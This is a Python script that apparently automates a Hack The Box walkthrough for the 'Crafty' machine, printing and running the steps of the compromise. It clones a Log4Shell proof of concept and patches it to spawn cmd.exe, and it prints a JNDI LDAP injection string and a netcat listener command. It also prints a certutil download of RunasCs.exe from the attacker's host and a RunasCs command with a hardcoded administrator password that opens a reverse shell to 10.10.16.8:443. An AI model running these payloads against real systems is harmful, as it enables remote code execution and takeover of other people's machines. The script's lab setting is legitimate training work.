import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
import textwrap

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Crafty
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] svc_minecraft","[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.249" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit Port] > " + Fore.YELLOW + f"{target_machine}:25565");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Crafty Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------


def exploit_log4jshell():
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"Download linux-x64 > " + Fore.LIGHTCYAN_EX + "https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20241227-281");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"Download jdk .tar.gz > " + Fore.LIGHTCYAN_EX + "https://www.oracle.com/pe/java/technologies/javase/javase8-archive-downloads.html");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"log4j-shell-poc [installed]:) > " + Fore.LIGHTCYAN_EX + "https://github.com/kozmer/log4j-shell-poc");cm.sleep(.5)
    commands_send("git clone https://github.com/kozmer/log4j-shell-poc")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [svc_minecraft] > " + Fore.WHITE + f"Press ENTER to continue...")
    commands_send("chmod +x MinecraftClient-20241227-*")
    commands_send("cd log4j-shell-poc && tar -xf jdk*.tar.gz")
    commands_send("cd log4j-shell-poc && sed -i \"s~String cmd=\"/bin/sh\";~String cmd=\"cmd.exe\";~\" poc.py")
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "./MinecraftClient*");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"In MinecraftClient type this... > " + Fore.LIGHTCYAN_EX + "1. cwe | 2. Press enter | 3. Server-Ip: crafty.htb");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f"python3 poc.py --userip {machine_ip} --webport 8000 --lport 443");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"In MinecraftClient type command > " + Fore.LIGHTCYAN_EX + f"{{jndi:ldap://{machine_ip}:1389/a}}");cm.sleep(.5)

def exploit_plugin_administrator():
    
    # OPTIONAL-------------
    # print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo impacket-smbserver smbFolder $(pwd) -smb2support -username cwe -password cwe ");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command [Windows] > " + Fore.LIGHTCYAN_EX + r"cd \Users\svc_minecraft\server\plugins");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command [Windows] > " + Fore.LIGHTCYAN_EX + f"net use \\{machine_ip}\smbFolder /u:cwe cwe ");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command [Windows] > " + Fore.LIGHTCYAN_EX + f"copy playercounter-1.0-SNAPSHOT.jar \\{machine_ip}\smbFolder\playercounter.jar");cm.sleep(.5)
    # #open jar with jd-gui
    # ---------------------
    
    print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Download RunasCs.zip > " + Fore.LIGHTCYAN_EX + "https://github.com/antonioCoco/RunasCs/releases/tag/v1.5");cm.sleep(.5)
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [system32] > " + Fore.WHITE + f"Press ENTER to continue...")
    commands_send("unzip RunasCs.zip")
    print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo python3 http.server 80");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command [Windows] > " + Fore.LIGHTCYAN_EX + "cd \Windows\Temp");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command [Windows] > " + Fore.LIGHTCYAN_EX + f"certutil.exe -f -urlcache -split http://{machine_ip}:80/RunasCs.exe");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - system32] > " + Fore.YELLOW + f"Run command [Windows] > " + Fore.LIGHTCYAN_EX + ".\RunasCs.exe administrator s67u84zKq8IXw cmd.exe -r 10.10.16.8:443");cm.sleep(.5)

    
#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","svc_minecraft connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Exploit - svc_minecraft] > " + Fore.YELLOW + f"log4j-shell-poc epxloit");cm.sleep(0.2)
                exploit_log4jshell()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[svc_minecraft] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator user connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Exploit - administrator-user] > " + Fore.YELLOW + f"PlayerCounter.jar Plugin exploit");cm.sleep(0.2)
                exploit_plugin_administrator() 
                print(tmsg,Fore.LIGHTBLUE_EX +f"[administrator-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
